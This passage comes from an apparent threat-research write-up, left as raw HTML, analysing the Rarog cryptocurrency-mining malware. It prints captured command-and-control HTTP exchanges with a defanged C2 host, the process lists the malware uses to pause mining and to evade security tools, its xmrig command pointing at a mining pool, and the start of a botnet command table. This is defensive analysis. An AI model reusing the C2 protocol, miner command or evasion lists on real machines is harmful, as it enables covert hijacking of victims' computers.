					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9d5763319264-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d5763319264-2">2</div><div class="crayon-num" data-line="crayon-676268260c9d5763319264-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d5763319264-4">4</div><div class="crayon-num" data-line="crayon-676268260c9d5763319264-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d5763319264-6">6</div><div class="crayon-num" data-line="crayon-676268260c9d5763319264-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d5763319264-8">8</div><div class="crayon-num" data-line="crayon-676268260c9d5763319264-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d5763319264-10">10</div><div class="crayon-num" data-line="crayon-676268260c9d5763319264-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d5763319264-12">12</div><div class="crayon-num" data-line="crayon-676268260c9d5763319264-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d5763319264-14">14</div><div class="crayon-num" data-line="crayon-676268260c9d5763319264-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9d5763319264-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span>/<span class="crayon-cn">4.0</span>/<span class="crayon-i">method</span>/<span class="crayon-e">cores </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d5763319264-2"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Keep</span>-<span class="crayon-e">Alive</span></div><div class="crayon-line" id="crayon-676268260c9d5763319264-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">x</span>-<span class="crayon-i">www</span>-<span class="crayon-i">form</span>-<span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d5763319264-4"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Rarog</span>/<span class="crayon-cn">5.0</span></div><div class="crayon-line" id="crayon-676268260c9d5763319264-5"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">6</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d5763319264-6"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">api</span><span class="crayon-sy">.</span><span class="crayon-i">polotreck</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">xyz</span></div><div class="crayon-line" id="crayon-676268260c9d5763319264-7"><span class="crayon-i">id</span>=<span class="crayon-cn">250</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d5763319264-8"><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-h"> </span><span class="crayon-e">OK</span></div><div class="crayon-line" id="crayon-676268260c9d5763319264-9"><span class="crayon-i">Server</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">nginx</span>/<span class="crayon-cn">1.13.10</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d5763319264-10"><span class="crayon-i">Date</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Wed</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">21</span><span class="crayon-h"> </span><span class="crayon-i">Mar</span><span class="crayon-h"> </span><span class="crayon-cn">2018</span><span class="crayon-h"> </span><span class="crayon-cn">17</span><span class="crayon-sy">:</span><span class="crayon-cn">03</span><span class="crayon-sy">:</span><span class="crayon-cn">18</span><span class="crayon-h"> </span><span class="crayon-e">GMT</span></div><div class="crayon-line" id="crayon-676268260c9d5763319264-11"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">text</span>/<span class="crayon-i">html</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">charset</span>=<span class="crayon-i">UTF</span>-<span class="crayon-cn">8</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d5763319264-12"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">4</span></div><div class="crayon-line" id="crayon-676268260c9d5763319264-13"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span>-<span class="crayon-i">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d5763319264-14"><span class="crayon-i">X</span>-<span class="crayon-i">Powered</span>-<span class="crayon-i">By</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">PHP</span>/<span class="crayon-cn">5.6.30</span>-<span class="crayon-cn">0</span>+<span class="crayon-e">deb8u1</span></div><div class="crayon-line" id="crayon-676268260c9d5763319264-15"><span class="crayon-i">NTA</span>=</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The response decodes to a value of ‘50’. Rarog continues to make a request to ‘/4.0/method/blacklist’ determine what processes should be blacklisted. The server in question did not have a configured blacklist, but an example of what may be returned is shown below:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9d6236054273" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
dota2.exe;csgo.exe;WorldOfTanks.exe;TslGame.exe;gta5.exe;photoshop.exe;vegas_pro.exe;premier.exe;Prey.exe;Overwatch.exe;MK10.exe;Minecraft.exe;DiabloIII.exe;QuakeChampions.exe;Acrobat.exe;Acrord32.exe</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9d6236054273-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9d6236054273-1"><span class="crayon-i">dota2</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">csgo</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">WorldOfTanks</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">TslGame</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">gta5</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">photoshop</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">vegas_pro</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">premier</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">Prey</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">Overwatch</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">MK10</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">Minecraft</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">DiabloIII</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">QuakeChampions</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">Acrobat</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-sy">;</span><span class="crayon-i">Acrord32</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>This list represents common resource-intensive applications, such as games, that Rarog will continually monitor for. In the event such a program is running in the foreground, Rarog will suspend mining operations.<br />
The malware then makes the following request to retrieve the amount of time that Rarog will sleep before mining on the target victim:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9d8828718729" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /2.0/method/delay HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0
Content-Length: 6
Host: api.polotreck[.]xyz
id=250
HTTP/1.1 200 OK
Server: nginx/1.13.10
Date: Wed, 21 Mar 2018 17:11:05 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 5
Connection: keep-alive
X-Powered-By: PHP/5.6.30-0+deb8u1
10000</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9d8828718729-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d8828718729-2">2</div><div class="crayon-num" data-line="crayon-676268260c9d8828718729-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d8828718729-4">4</div><div class="crayon-num" data-line="crayon-676268260c9d8828718729-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d8828718729-6">6</div><div class="crayon-num" data-line="crayon-676268260c9d8828718729-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d8828718729-8">8</div><div class="crayon-num" data-line="crayon-676268260c9d8828718729-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d8828718729-10">10</div><div class="crayon-num" data-line="crayon-676268260c9d8828718729-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d8828718729-12">12</div><div class="crayon-num" data-line="crayon-676268260c9d8828718729-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9d8828718729-14">14</div><div class="crayon-num" data-line="crayon-676268260c9d8828718729-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9d8828718729-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span>/<span class="crayon-cn">2.0</span>/<span class="crayon-i">method</span>/<span class="crayon-e">delay </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d8828718729-2"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Keep</span>-<span class="crayon-e">Alive</span></div><div class="crayon-line" id="crayon-676268260c9d8828718729-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">x</span>-<span class="crayon-i">www</span>-<span class="crayon-i">form</span>-<span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d8828718729-4"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Rarog</span>/<span class="crayon-cn">5.0</span></div><div class="crayon-line" id="crayon-676268260c9d8828718729-5"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">6</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d8828718729-6"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">api</span><span class="crayon-sy">.</span><span class="crayon-i">polotreck</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">xyz</span></div><div class="crayon-line" id="crayon-676268260c9d8828718729-7"><span class="crayon-i">id</span>=<span class="crayon-cn">250</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d8828718729-8"><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-h"> </span><span class="crayon-e">OK</span></div><div class="crayon-line" id="crayon-676268260c9d8828718729-9"><span class="crayon-i">Server</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">nginx</span>/<span class="crayon-cn">1.13.10</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d8828718729-10"><span class="crayon-i">Date</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Wed</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">21</span><span class="crayon-h"> </span><span class="crayon-i">Mar</span><span class="crayon-h"> </span><span class="crayon-cn">2018</span><span class="crayon-h"> </span><span class="crayon-cn">17</span><span class="crayon-sy">:</span><span class="crayon-cn">11</span><span class="crayon-sy">:</span><span class="crayon-cn">05</span><span class="crayon-h"> </span><span class="crayon-e">GMT</span></div><div class="crayon-line" id="crayon-676268260c9d8828718729-11"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">text</span>/<span class="crayon-i">html</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">charset</span>=<span class="crayon-i">UTF</span>-<span class="crayon-cn">8</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d8828718729-12"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">5</span></div><div class="crayon-line" id="crayon-676268260c9d8828718729-13"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span>-<span class="crayon-i">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9d8828718729-14"><span class="crayon-i">X</span>-<span class="crayon-i">Powered</span>-<span class="crayon-i">By</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">PHP</span>/<span class="crayon-cn">5.6.30</span>-<span class="crayon-cn">0</span>+<span class="crayon-i">deb8u1</span></div><div class="crayon-line" id="crayon-676268260c9d8828718729-15"><span class="crayon-cn">10000</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Prior to continuing, Rarog will check the running processes on the system for the following common security applications, and will not proceed if found:</p>
<ul>
<li>NetMonitor</li>
<li>Taskmgr.exe</li>
<li>Process Killer</li>
<li>KillProcess</li>
<li>System Explorer</li>
<li>AnVir</li>
<li>Process Hacker</li>
</ul>
<p>Rarog takes the previously collected CPU usage percentage and applies it against the number of CPUs found on the system. As an example, if a system had four CPU cores, and the setting was at 50%, Rarog could configure the miner to use 2 threads (0.5 x 4). The following mining command is executed by Rarog:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9d9308120810" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
C:\ProgramData\{CB28D9D3-6B5D-4AFA-BA37-B4AFAABF70B8}\xmrig32.exe -o xmr.pool.minergate[.]com:45560 -u more2set@protonmail[.]com -p x -k -t 1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9d9308120810-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9d9308120810-1"><span class="crayon-i">C</span><span class="crayon-sy">:</span><span class="crayon-sy">\</span><span class="crayon-e">ProgramData</span><span class="crayon-sy">\</span><span class="crayon-sy">{</span><span class="crayon-i">CB28D9D3</span>-<span class="crayon-cn">6B5D</span>-<span class="crayon-cn">4AFA</span>-<span class="crayon-i">BA37</span>-<span class="crayon-i">B4AFAABF70B8</span><span class="crayon-sy">}</span><span class="crayon-sy">\</span><span class="crayon-i">xmrig32</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span>-<span class="crayon-i">o</span><span class="crayon-h"> </span><span class="crayon-i">xmr</span><span class="crayon-sy">.</span><span class="crayon-i">pool</span><span class="crayon-sy">.</span><span class="crayon-i">minergate</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-i">com</span><span class="crayon-sy">:</span><span class="crayon-cn">45560</span><span class="crayon-h"> </span>-<span class="crayon-i">u</span><span class="crayon-h"> </span><span class="crayon-i">more2set</span><span class="crayon-sy">@</span><span class="crayon-i">protonmail</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-i">com</span><span class="crayon-h"> </span>-<span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-i">x</span><span class="crayon-h"> </span>-<span class="crayon-i">k</span><span class="crayon-h"> </span>-<span class="crayon-i">t</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>&nbsp;<br />
<strong>Botnet Functionality</strong><br />
Rarog will periodically make HTTP POST requests to the following:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9db067757479" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /2.0/method/setOnline HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0
Content-Length: 16
Host: api.polotreck[.]xyz
id=250&amp;build=5.1
HTTP/1.1 200 OK
Server: nginx/1.13.10
Date: Wed, 21 Mar 2018 17:28:27 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive
X-Powered-By: PHP/5.6.30-0+deb8u1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9db067757479-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9db067757479-2">2</div><div class="crayon-num" data-line="crayon-676268260c9db067757479-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9db067757479-4">4</div><div class="crayon-num" data-line="crayon-676268260c9db067757479-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9db067757479-6">6</div><div class="crayon-num" data-line="crayon-676268260c9db067757479-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9db067757479-8">8</div><div class="crayon-num" data-line="crayon-676268260c9db067757479-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9db067757479-10">10</div><div class="crayon-num" data-line="crayon-676268260c9db067757479-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9db067757479-12">12</div><div class="crayon-num" data-line="crayon-676268260c9db067757479-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9db067757479-14">14</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9db067757479-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span>/<span class="crayon-cn">2.0</span>/<span class="crayon-i">method</span>/<span class="crayon-e">setOnline </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9db067757479-2"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Keep</span>-<span class="crayon-e">Alive</span></div><div class="crayon-line" id="crayon-676268260c9db067757479-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">x</span>-<span class="crayon-i">www</span>-<span class="crayon-i">form</span>-<span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9db067757479-4"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Rarog</span>/<span class="crayon-cn">5.0</span></div><div class="crayon-line" id="crayon-676268260c9db067757479-5"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">16</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9db067757479-6"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">api</span><span class="crayon-sy">.</span><span class="crayon-i">polotreck</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">xyz</span></div><div class="crayon-line" id="crayon-676268260c9db067757479-7"><span class="crayon-i">id</span>=<span class="crayon-cn">250</span><span class="crayon-sy">&amp;build=5.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9db067757479-8"><span class="crayon-sy">HTTP/1.1 200 OK</span></div><div class="crayon-line" id="crayon-676268260c9db067757479-9"><span class="crayon-sy">Server: nginx/1.13.10</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9db067757479-10"><span class="crayon-sy">Date: Wed, 21 Mar 2018 17:28:27 GMT</span></div><div class="crayon-line" id="crayon-676268260c9db067757479-11"><span class="crayon-sy">Content-Type: text/html;</span><span class="crayon-h"> </span><span class="crayon-i">charset</span>=<span class="crayon-i">UTF</span>-<span class="crayon-cn">8</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9db067757479-12"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-676268260c9db067757479-13"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span>-<span class="crayon-i">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9db067757479-14"><span class="crayon-i">X</span>-<span class="crayon-i">Powered</span>-<span class="crayon-i">By</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">PHP</span>/<span class="crayon-cn">5.6.30</span>-<span class="crayon-cn">0</span>+<span class="crayon-i">deb8u1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>This particular URI has the ability to provide additional tasks for Rarog to perform. The following list of supported commands are included:</p>
<table align="center">
<tbody>
<tr>
<td width="138"><strong>Command</strong></td>
<td width="486"><strong>Description</strong></td>
</tr>
<tr>
<td width="138">install</td>
<td width="486">Download and execute specified file</td>
</tr>
<tr>
